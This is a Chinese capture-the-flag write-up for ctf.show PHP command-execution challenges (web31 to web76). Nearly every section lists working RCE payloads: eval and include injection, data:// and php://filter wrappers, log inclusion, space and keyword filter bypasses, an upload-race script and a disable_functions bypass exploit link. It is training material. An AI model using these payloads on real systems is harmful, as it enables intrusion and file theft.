<p>cat被过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是</span><br><span class="line">cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 file -f:报错出具体内容 grep</span><br><span class="line"><span class="number">1</span>、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line">c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>fl[abc]*`);</span><br><span class="line">c=<span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;nl%09fl[a]*&quot;</span>);等价于<span class="title function_ invoke__">system</span>()</span><br><span class="line">c=<span class="keyword">echo</span>`strings%<span class="number">09</span>f*`;</span><br><span class="line">c=<span class="keyword">echo</span>`strings\<span class="variable">$IFS</span>\$<span class="number">9</span>f*`必须加转义字符</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>还有其他姿势：<br>首先print_r(scandir(dirname(<strong>FILE</strong>)));查看当前目录下文件<br>然后找到flag.php<br>print_r(next(array_reverse(scandir(dirname(<strong>FILE</strong>)))));<br>之后高亮显示即可<br>c&#x3D;highlight_file(next(array_reverse(scandir(dirname(<strong>FILE</strong>)))));</p>
<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p>小知识：include不用括号，分号可以用?&gt;代替。<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-</span></span><br><span class="line">encode/resource=flag.php</span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h1><p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br><span class="line">还可以配合UA头执行日志包含</span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><p>在上一道题的基础上过滤了php，和file<br>所以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=</span></span><br><span class="line">也可以日志包含</span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system(“cat f*”);?&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><p>我字母数字RCE，我之后会另一起一篇，单独讲这个。</p>
<h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</span><br><span class="line">所以不能让后面执行，所以需要把后面截断ls;%<span class="number">0</span>a,后面不用多说了吧,还可以用%<span class="number">26</span>以及||</span><br></pre></td></tr></table></figure>


<h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><p>和42没多大区别。。。。，过滤了cat<code>nl%20flag.php%0a</code></p>
<h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><p>过滤了flag,没啥好说的通配符呗</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">20</span>fl*%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<h1 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h1><p>多过滤了一个空格，总所周知php环境下可以用%09代题空格<br>c&#x3D;nl%09fl*%0a<br>或者使用内联执行<br>c&#x3D;echo反引号nl$IFS*反引号%0A</p>
<h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><p>多过滤了一些数字啥的，等于没来，然后过滤了flag也可以其他姿势\ ‘’ “”等等都行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>还可以是,因为||默认是前面成功则不执行后面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl%<span class="number">09</span>fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web47-48"><a href="#web47-48" class="headerlink" title="web47-48"></a>web47-48</h1><p>过滤了一点命令等于没说</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><p>看了一眼，也就是多过滤了几个命令而已，这里当作练习多给点payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload1:c=nl%<span class="number">09</span>fla\g.php||</span><br><span class="line">payload2:c=nl%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload3:c=nl%<span class="number">09</span>fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a</span><br><span class="line">payload4:c=nl%<span class="number">09</span>fla<span class="string">&quot;&quot;</span>g.php%<span class="number">0</span>a</span><br><span class="line">payload5:c=vi%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload6:c=tac%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload7:c=uniq%<span class="number">09</span>fla\g.php%<span class="number">0</span>a</span><br><span class="line">payload8:c=nl&lt;fla<span class="string">&#x27;&#x27;</span>g.php||</span><br><span class="line">payload9:c=nl%<span class="number">09</span>fla\g.php%<span class="number">26</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><p>我看了一眼%09被过滤了，除此之外也没啥新的基本上，随便来个payload进入下一关吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><p>啊这，看了一眼%也被过滤了，不过也没啥，还是上一道的payloadc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><p>虽然很多能当空格的都被过滤了但是，<code>$</code>却没有过滤，那么很明显了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=nl<span class="variable">$IFS</span>\fla\g.php||</span><br></pre></td></tr></table></figure>


<h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><p>感觉换了一个系列吧，这里随便来两个payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload1:c<span class="string">&#x27;&#x27;</span>at$&#123;IFS&#125;fla<span class="string">&#x27;&#x27;</span>g.p<span class="string">&#x27;&#x27;</span>hp</span><br><span class="line">payload2:c=nl<span class="variable">$IFS</span>\fla\g.php</span><br></pre></td></tr></table></figure>




<h1 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h1><p>加强了正则表达式，通配符就行了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=/bin/c??$&#123;IFS&#125;????????</span><br><span class="line">c=/bin/c??<span class="variable">$IFS</span>????????</span><br></pre></td></tr></table></figure>


<h1 id="web55-56"><a href="#web55-56" class="headerlink" title="web55-56"></a>web55-56</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    url = <span class="string">&quot;http://44875025-cec2-4154-8d87-34cbdcff5f27.chall.ctf.show/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, b<span class="string">&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.<span class="title function_ invoke__">find</span>(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://s2.loli.net/2022/03/26/ez4BhNt5li6Zy3n.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=/???/????<span class="number">64</span> ????????</span><br></pre></td></tr></table></figure>


<h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><p>这道题的目的是构造<code>36</code>这个数字,这里利用了<code>$(( ))与整数运算</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(())------是-<span class="number">1</span></span><br><span class="line">$((~<span class="number">37</span>))------是<span class="number">36</span></span><br><span class="line">所以我们只需要保证中间是-<span class="number">37</span>即可，</span><br><span class="line">$((~$(())$(())))---是<span class="number">1</span></span><br><span class="line">所以</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))代表<span class="number">36</span>，即可获取flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><p>接下来的系列是绕过disable_functions系列，为了锻炼自己我决定多尝试几种姿势，都是从羽师傅那里学习到的，参考链接见下方</p>
<p>首先要获取文件路径，在这里我们可以用两种方式，我暂时想到这两种</p>
<p><code>c=print_r(scandir(dirname(&#39;``**FILE**``&#39;)));</code></p>
<p><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code>因为没有任何过滤我们便可以读取任意的文件</p>
<p><code>c=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过单一函数读取文件</span></span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line"><span class="comment">//这里做一个解释`file — 把整个文件读入一个数组中`</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">通过fopen去读取文件内容，这里介绍下函数</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">fgets</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetc</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetss</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetcsv</span>()</span><br><span class="line"><span class="title function_ invoke__">gpassthru</span>()</span><br><span class="line">payload:</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//一行一行读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//一个一个字符读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过高亮显示php文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);             </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);             </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h1><p>首先查找flag文件的地址<code>c=print_r(scandir(&#39;./&#39;));</code>找到在当前目录下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//paylaod汇总</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&quot;flag.php&quot;</span>)); </span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fpassthru</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h1><p>首先查找flag文件的地址<code>c=print_r(scandir(&#39;./&#39;));</code>找到在当前目录下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload汇总</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>同时记录一个,但是这道题不能用<code>$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125; //php7.3版本后 该函数已不再被使用</code>还有新姿势</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>()</span><br><span class="line"><span class="title function_ invoke__">rename</span>()</span><br><span class="line"><span class="comment">//用法：</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);             <span class="comment">//过60</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);           <span class="comment">//过60</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web61-65"><a href="#web61-65" class="headerlink" title="web61-65"></a>web61-65</h1><p>为了熟悉学习新姿势<code>c=$a=opendir(&#39;./&#39;);while(($file = readdir($a)) !=false)&#123;echo $file.&quot; &quot;;&#125;</code>或者<code>c=print_r(scandir(current(localeconv())));</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload:</span></span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h1><p>扫描目录<code>c=var_dump(scandir(&quot;/&quot;));</code>,发现是<code>flag.txt</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//下面是payload</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h1><p>快乐第一步扫描目录<code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload介绍</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>代码审计,这里先介绍几个函数<br>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
<p>然后看这里有一句官方的介绍</p>
<blockquote>
<p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//在网页中会输出内容</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="comment">//在这里则在网页当中没有输出内容，不难看出其取得了缓冲区的内容并清空了缓冲区</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>所以不难想出payload<code>c=require_once(&#39;/flag.txt&#39;);exit();</code>这里通过<code>exit();</code>使程序提前退出，绕过后面的正则表达式</p>
<h1 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;?&gt;&lt;?php echo 111;?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这里的?&gt;是为了闭合前面&lt;?php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:https:<span class="comment">//github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</span></span><br><span class="line">需要把里面的payload进行url编码</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h1><p>第一步扫描目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">payload:</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h1><p>第一步扫描目录</p>
<p><code>c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);</code></p>
<p>利用mysql load_file读文件</p>
